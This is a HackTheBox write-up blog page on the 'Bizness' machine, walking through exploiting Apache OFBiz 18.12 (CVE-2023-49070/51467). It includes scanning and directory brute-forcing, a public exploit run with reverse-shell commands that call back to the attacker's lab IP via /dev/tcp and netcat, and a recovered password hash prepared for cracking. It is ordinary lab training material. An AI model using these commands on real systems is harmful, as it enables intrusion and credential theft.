<!doctype html><html lang=en><head><title>'Bizness' HackTheBox WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Bizness' HackTheBox WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Bizness' HackTheBox WriteUp"><meta name=twitter:description content="'Bizness' HackTheBox WriteUp"><meta property="og:title" content="'Bizness' HackTheBox WriteUp"><meta property="og:description" content="'Bizness' HackTheBox WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/bizness/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-25T00:00:00+00:00"><meta property="article:modified_time" content="2024-05-25T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/bizness/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/bizness/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/bizness/>'Bizness' HackTheBox WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-05-25T00:00:00Z>25 May, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
10-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/remote-code-execution/>Remote Code Execution</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/apache/>Apache</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ofbiz/>Ofbiz</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/decrypt/>Decrypt</a></span></div></div></header><div class=post-content><hr><h1 id=bizness-machine----hackthebox>&lsquo;Bizness&rsquo; Machine &ndash; HackTheBox
<a class=heading-link href=#bizness-machine----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="Bizness Avatar" src=/pentesting/images/Bizness_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Bizness is an easy box/machine from HackTheBox. Through a simple scan for hidden directories we note that this server is running a vulnerable <code>Apache OFBiz</code> version that allows <code>Remote Code Execution</code>. Once inside the machine we can search for data inside files and, eventually, reach an encrypted password. Using these encrypted credentials, along with typical password dictionaries, we are able to find the <code>root</code> user password.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan shows 4 ports open: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code>, <code>443</code> <code>HTTPs</code>, and <code>46513</code> an unknown service.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,443,46513 10.10.11.252 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 21:59 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.252
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.19s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http       nginx 1.18.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span></span><span class=line><span class=cl><span class=go>443/tcp   open  ssl/http   nginx 1.18.0
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| tls-nextprotoneg:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-12-14T20:03:40
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2328-11-10T20:03:40
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://bizness.htb/
</span></span></span><span class=line><span class=cl><span class=go>46513/tcp open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 26.84 seconds
</span></span></span></code></pre></div><ul><li>From the scan I notice that port <code>80</code> <code>HTTP</code> is redirecting to <code>bizness.htb</code>, so I add this domain to my <code>/etc/hosts</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.252 bizness.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Once added we can visit <code>https://bizness.htb</code> and we can see the following webpage:</li></ul><p><img alt=Bizness_1.png src=/pentesting/images/Bizness_1.png></p><ul><li>Many of the buttons from the webpage do not work, so I will attempt a <code>Brute Force Directory Listing</code> with <code>Gobuster</code> to find some directories:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://bizness.htb -t 55 -k --exclude-length 0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     https://bizness.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] Exclude Length:          0
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/control              (Status: 200) [Size: 34633]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fwww     (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fyoutube (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fblogs   (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fblog    (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/**http%3A%2F%2Fwww   (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/External%5CX-News    (Status: 400) [Size: 795]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fcommunity (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fradar   (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fweblog  (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>/http%3A%2F%2Fswik    (Status: 400) [Size: 841]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 220560 / 220561 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>where, without including false positives, we find a <code>/control</code> directory.</p><ul><li>Visiting this site, <code>https://bizness.htb/control</code>, shows the following:</li></ul><p><img alt=Bizness_2.png src=/pentesting/images/Bizness_2.png></p><p>where we can see we are against an <code>Apache</code> server, more specifically <code>OFBiz</code> project.</p><ul><li>Searching for more directories within <code>/control</code>, but this time filtering by some false positives (that had a length between <code>34000</code> and <code>35000</code>), we find more pages:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://bizness.htb/control -t 55 -k --exclude-length 34000-35000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     https://bizness.htb/control
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] Exclude Length: &lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/login                (Status: 200) [Size: 11061]
</span></span></span><span class=line><span class=cl><span class=go>/main                 (Status: 200) [Size: 9309]
</span></span></span><span class=line><span class=cl><span class=go>/help                 (Status: 200) [Size: 10757]
</span></span></span><span class=line><span class=cl><span class=go>/view                 (Status: 200) [Size: 9309]
</span></span></span><span class=line><span class=cl><span class=go>/logout               (Status: 200) [Size: 10757]
</span></span></span><span class=line><span class=cl><span class=go>/views                (Status: 200) [Size: 9309]
</span></span></span><span class=line><span class=cl><span class=go>/forgotPassword       (Status: 200) [Size: 11061]
</span></span></span></code></pre></div><ul><li>If we visit <code>https://bizness.htb//control/login</code> we can see a login page:</li></ul><p><img alt=Bizness_3.png src=/pentesting/images/Bizness_3.png></p><p>where, as can be observed from the image, at the bottom right it says that the version is <code>18.12</code> for <code>Apache</code> <code>OFBiz</code>.</p><ul><li>Searching for exploits for this version shows 2 vulnerabilities: <code>CVE-2023-49070</code> and <code>CVE-2023-51467</code> (see, for example, <a href=https://threatprotect.qualys.com/2023/12/27/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467/ class=external-link target=_blank rel=noopener>this blog</a>). This vulnerability has been flagged as critical since it could allow unauthenticated <code>Remote Code Execution</code> (<code>RCE</code>).</li><li>I find <a href=https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass class=external-link target=_blank rel=noopener>this Github repository</a> for these vulnerabilities. I clone it into my machine running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;Apache-OFBiz-Authentication-Bypass&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 19, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (14/14), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (12/12), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 19 (delta 3), reused 7 (delta 1), pack-reused 5
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (19/19), 51.44 MiB | 17.24 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (3/3), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cd Apache-OFBiz-Authentication-Bypass
</span></span></span></code></pre></div><ul><li>To first check the exploit works and we a <code>Remote Code Execution</code>, I first start listening to <code>ICMP</code> traces with <code>tcpdump</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span></code></pre></div><p>where <code>tun0</code> is <code>HackTheBox</code> net interface</p><ul><li>Then, run the exploit sending a <code>ping</code> command against my attacker machine with IP <code>10.10.16.6</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 exploit.py --url &#39;https://bizness.htb&#39; --cmd &#39;ping -c1 10.10.16.6&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Generating payload...
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>[+] Payload generated successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Sending malicious serialized payload...
</span></span></span><span class=line><span class=cl><span class=go>[+] The request has been successfully sent. Check the result of the command.
</span></span></span></code></pre></div><p>and in my <code>tcpdump</code> listener I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni tun0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>23:14:05.107660 IP 10.10.11.252 &gt; 10.10.16.6: ICMP echo request, id 9015, seq 1, length 64
</span></span></span><span class=line><span class=cl><span class=go>23:14:05.107676 IP 10.10.16.6 &gt; 10.10.11.252: ICMP echo reply, id 9015, seq 1, length 64
</span></span></span></code></pre></div><p>so this exploit works.</p><ul><li>I start a <code>netcat</code> listener on port <code>443</code> on my attacker machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>and, in another panel/window, I run the exploit sending a reverse shell to my machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 exploit.py --url &#39;https://bizness.htb&#39; --cmd &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&#34;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Generating payload...
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>[+] Payload generated successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Sending malicious serialized payload...
</span></span></span><span class=line><span class=cl><span class=go>[+] The request has been successfully sent. Check the result of the command.
</span></span></span></code></pre></div><p>but this does not work. So instead of attempting to send a reverse shell with <code>bash -i</code>, I will try to do this with <code>netcat</code>, running the exploit with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 exploit.py --url &#39;https://bizness.htb&#39; --cmd &#39;nc 10.10.16.6 443 -e /bin/bash&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Generating payload...
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>[+] Payload generated successfully.
</span></span></span><span class=line><span class=cl><span class=go>[+] Sending malicious serialized payload...
</span></span></span><span class=line><span class=cl><span class=go>[+] The request has been successfully sent. Check the result of the command.
</span></span></span></code></pre></div><p>and in <code>netcat</code> listener I get a shell as <code>ofbiz</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.252] 40808
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>ofbiz
</span></span></span></code></pre></div><p>where we can get the user flag at <code>/home/ofbiz</code> directory.</p><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>After searching some files from <code>/opt/ofbiz</code> directory we reach the directory <code>/opt/ofbiz/framework/resources</code>. Inside this directory we have some interesting files:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ofbiz@bizness:/opt/ofbiz/framework/resources$ cd /opt/ofbiz/framework/resources/templates
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ofbiz@bizness:/opt/ofbiz/framework/resources/templates$ ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 112
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>drwxr-xr-x 2 ofbiz ofbiz-operator 4096 Dec 21 09:15 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1351 Oct 13  2023 AdminNewTenantData-Derby.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1368 Oct 13  2023 AdminNewTenantData-MySQL.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1378 Oct 13  2023 AdminNewTenantData-Oracle.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1378 Oct 13  2023 AdminNewTenantData-PostgreSQL.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1084 Oct 13  2023 AdminUserLoginData.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1135 Oct 13  2023 build.gradle
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 3279 Oct 13  2023 CommonScreens.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 2119 Oct 13  2023 controller.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator  843 Oct 13  2023 DemoData.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1400 Oct 13  2023 document.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1333 Oct 13  2023 entitymodel.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1028 Oct 13  2023 Forms.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1236 Oct 13  2023 HELP.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator  806 Oct 13  2023 index.jsp
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1304 Oct 13  2023 Menus.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 2892 Oct 13  2023 ofbiz-component.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator  187 Oct 13  2023 README.txt
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1582 Oct 13  2023 Screens.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1704 Oct 13  2023 SecurityGroupDemoData.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1666 Oct 13  2023 SecurityPermissionSeedData.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1318 Oct 13  2023 services.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 1021 Oct 13  2023 Tests.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator  843 Oct 13  2023 TypeData.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 2195 Oct 13  2023 UiLabels.xml
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 ofbiz ofbiz-operator 5050 Oct 13  2023 web.xml
</span></span></span></code></pre></div><ul><li>If we check the file <code>AdminUserLoginData.xml</code> it shows something:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>Licensed to the Apache Software Foundation (ASF) under one
</span></span></span><span class=line><span class=cl><span class=c>or more contributor license agreements.  See the NOTICE file
</span></span></span><span class=line><span class=cl><span class=c>distributed with this work for additional information
</span></span></span><span class=line><span class=cl><span class=c>regarding copyright ownership.  The ASF licenses this file
</span></span></span><span class=line><span class=cl><span class=c>to you under the Apache License, Version 2.0 (the
</span></span></span><span class=line><span class=cl><span class=c>&#34;License&#34;); you may not use this file except in compliance
</span></span></span><span class=line><span class=cl><span class=c>with the License.  You may obtain a copy of the License at
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>http://www.apache.org/licenses/LICENSE-2.0
</span></span></span><span class=line><span class=cl><span class=c>
</span></span></span><span class=line><span class=cl><span class=c>Unless required by applicable law or agreed to in writing,
</span></span></span><span class=line><span class=cl><span class=c>software distributed under the License is distributed on an
</span></span></span><span class=line><span class=cl><span class=c>&#34;AS IS&#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
</span></span></span><span class=line><span class=cl><span class=c>KIND, either express or implied.  See the License for the
</span></span></span><span class=line><span class=cl><span class=c>specific language governing permissions and limitations
</span></span></span><span class=line><span class=cl><span class=c>under the License.
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;entity-engine-xml&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;UserLogin</span> <span class=na>userLoginId=</span><span class=s>&#34;@userLoginId@&#34;</span> <span class=na>currentPassword=</span><span class=s>&#34;{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a&#34;</span> <span class=na>requirePasswordChange=</span><span class=s>&#34;Y&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;UserLoginSecurityGroup</span> <span class=na>groupId=</span><span class=s>&#34;SUPER&#34;</span> <span class=na>userLoginId=</span><span class=s>&#34;@userLoginId@&#34;</span> <span class=na>fromDate=</span><span class=s>&#34;2001-01-01 12:00:00.0&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>apparently, there is a password hash: <code>47ca69ebb4bdc9ae0adec130880165d2cc05db1a</code></p><ul><li>Copying this hash and checking its type with <code>hash-identifier</code> confirms that is is a <code>SHA</code> hash type:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hash-identifier
